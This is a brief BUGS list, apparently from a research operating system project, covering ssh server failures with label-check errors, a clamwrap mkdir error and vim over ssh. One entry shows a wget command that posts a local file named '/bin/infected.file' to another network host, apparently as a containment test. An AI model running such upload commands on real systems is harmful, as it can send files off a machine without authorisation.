BUGS

(1) after a number of ssh connections, the ssh server stops working:

    Received disconnect from 10.0.0.2: 2: fork failed: Cannot allocate memory

    the console says:

    user panic at lib/netd_gatesrv.cc:56: netd_gate_entry: cannot copy back: invalid parameter

    and then for every new connection:

    fork: pkg/uclibc/libc/sysdeps/jos64/fork.cc:74: top_ct: label check failure
    netd_slow_call: gate_call: creating tainted container: label check failure

(2) wget http://10.0.0.1/ --post-file=/bin/infected.file
    seems to kill the ssh session:
	Disconnecting: Bad packet length 1589798565.
    but not if i use another IP in the wget URL that isn't the ssh client..

(3) clamwrap gives some error about not being able to mkdir something
    in /tmp when scanning a tar file like /bin/ssh.tar.

(4) vim doesn't seem to work over ssh -- would be cool to show.
    maybe this is related to using -T, in which case the bug is
    that ssh without -T doesn't seem to work.
